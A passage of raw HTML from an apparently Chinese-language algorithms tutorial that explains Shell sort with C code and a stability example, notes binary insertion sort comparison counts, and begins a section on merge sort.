id=\"crayon-5b4ad567a1b78079446195-45\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b78079446195-46\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b78079446195-47\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.3295 seconds] -->\r\n<p>当n较大时，二分插入排序的比较次数比直接插入排序的最差情况好得多，但比直接插入排序的最好情况要差，所当以元素初始序列已经接近升序时，直接插入排序比二分插入排序比较次数少。二分插入排序元素移动次数与直接插入排序相同，依赖于元素初始序列。</p>\n<h2>插入排序的更高效改进：希尔排序(Shell Sort)</h2>\n<p>希尔排序，也叫<strong>递减增量排序</strong>，是插入排序的一种更高效的改进版本。希尔排序是<strong>不稳定</strong>的排序算法。</p>\n<p>希尔排序是基于插入排序的以下两点性质而提出改进方法的：</p>\n<ul>\n<li>插入排序在对几乎已经排好序的数据操作时，效率高，即可以达到线性排序的效率</li>\n<li>但插入排序一般来说是低效的，因为插入排序每次只能将数据移动一位</li>\n</ul>\n<p>希尔排序通过将比较的全部元素分为几个区域来提升插入排序的性能。这样可以让一个元素可以一次性地朝最终位置前进一大步。然后算法再取越来越小的步长进行排序，算法的最后一步就是普通的插入排序，但是到了这步，需排序的数据几乎是已排好的了（此时插入排序较快）。<br>\n假设有一个很小的数据在一个已按升序排好序的数组的末端。如果用复杂度为O(n^2)的排序（冒泡排序或直接插入排序），可能会进行n次的比较和交换才能将该数据移至正确位置。而希尔排序会用较大的步长移动数据，所以小数据只需进行少数比较和交换即可到正确位置。</p>\n<p>希尔排序的代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ad567a1b7e209616801\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include &lt;stdio.h&gt;  \r\n\r\n// 分类 -------------- 内部比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- 根据步长序列的不同而不同。已知最好的为O(n(logn)^2)\r\n// 最优时间复杂度 ---- O(n)\r\n// 平均时间复杂度 ---- 根据步长序列的不同而不同。\r\n// 所需辅助空间 ------ O(1)\r\n// 稳定性 ------------ 不稳定\r\n\r\nvoid ShellSort(int A[], int n)\r\n{\r\n    int h = 0;\r\n    while (h &lt;= n)                          // 生成初始增量\r\n    {\r\n        h = 3 * h + 1;\r\n    }\r\n    while (h &gt;= 1)\r\n    {\r\n        for (int i = h; i &lt; n; i++)\r\n        {\r\n            int j = i - h;\r\n            int get = A[i];\r\n            while (j &gt;= 0 &amp;&amp; A[j] &gt; get)\r\n            {\r\n                A[j + h] = A[j];\r\n                j = j - h;\r\n            }\r\n            A[j + h] = get;\r\n        }\r\n        h = (h - 1) / 3;                    // 递减增量\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 5, 2, 9, 4, 7, 6, 1, 3, 8 };// 从小到大希尔排序\r\n    int n = sizeof(A) / sizeof(int);\r\n    ShellSort(A, n);\r\n    printf(\"希尔排序结果：\");\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4ad567a1b7e209616801-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4ad567a1b7e209616801-47\">47</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-1\"><span class=\"crayon-p\">#include &lt;stdio.h&gt;  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-3\"><span class=\"crayon-c\">// 分类 -------------- 内部比较排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-4\"><span class=\"crayon-c\">// 数据结构 ---------- 数组</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-5\"><span class=\"crayon-c\">// 最差时间复杂度 ---- 根据步长序列的不同而不同。已知最好的为O(n(logn)^2)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-6\"><span class=\"crayon-c\">// 最优时间复杂度 ---- O(n)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-7\"><span class=\"crayon-c\">// 平均时间复杂度 ---- 根据步长序列的不同而不同。</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-8\"><span class=\"crayon-c\">// 所需辅助空间 ------ O(1)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-9\"><span class=\"crayon-c\">// 稳定性 ------------ 不稳定</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-11\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ShellSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-12\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">                          </span><span class=\"crayon-c\">// 生成初始增量</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-22\"><span class=\"crayon-h\">            </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-23\"><span class=\"crayon-h\">            </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-24\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-25\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-26\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-27\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-28\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-29\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-30\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-31\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                    </span><span class=\"crayon-c\">// 递减增量</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-33\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-34\"> </div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-35\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-36\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">// 从小到大希尔排序</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-38\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">ShellSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-40\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"希尔排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-41\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-43\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-44\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-45\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4ad567a1b7e209616801-46\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4ad567a1b7e209616801-47\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.2729 seconds] -->\r\n<p>以23, 10, 4, 1的步长序列进行希尔排序：</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fr773rpleeg207p09kgsu.gif\" width=\"277\" height=\"344\"></p>\n<p><strong>希尔排序是不稳定的排序算法，</strong>虽然一次插入排序是稳定的，不会改变相同元素的相对顺序，但在不同的插入排序过程中，相同的元素可能在各自的插入排序中移动，最后其稳定性就会被打乱。</p>\n<p>比如序列：{ 3, 5, 10, 8, 7, 2, 8, 1, 20, 6 }，h=2时分成两个子序列 { 3, 10, 7, 8, 20 } 和  { 5, 8, 2, 1, 6 } ，未排序之前第二个子序列中的8在前面，现在对两个子序列进行插入排序，得到 { 3, 7, 8, 10, 20 } 和 { 1, 2, 5, 6, 8 } ，即 { 3, 1, 7, 2, 8, 5, 10, 6, 20, 8 } ，两个8的相对次序发生了改变。</p>\n<h2>归并排序(Merge Sort)</h2>\n<p>归并排序是创建在归并操作上的一种有效的排序算法，效率为O(nlogn)，1945年由冯·诺伊曼首次提出。</p>\n<p>归并排序的实现分为<strong>递归实现</strong>与<strong>非递归(迭代)实现</strong>。递归实现的归并排序是算法设计中分治策略的典型应用，我们将一个大问题分割成小问题分别解决，然后用所有小问题的答案来解决整个大问题。非递归(迭代)实现的归并排序首先进行是两两归并，然后四四归并，然后是八八归并，一直下去直到归并了整个数组。</p>\n<p>归并排序算法主要依赖归并(Merge)操作。归并操作指的是将两个已经排序的序列合并成一个序列的操作，<strong>归并操作</strong>步骤如下：</p>\n<ol>\n<li><strong>申请空间</strong>，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列</li>\n<li>设定两个指针，最初位置分别为两个已经排序序列的起始位置</li>\n<li>比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置</li>\n<li>重复步骤3直到某一指针到达序列尾</li>\n<li>将另一序列剩下的所有元素直接复制到合并序列尾</li>\n</ol>\n<p>归并排序的代码如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4ad567a1b84396513457\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" 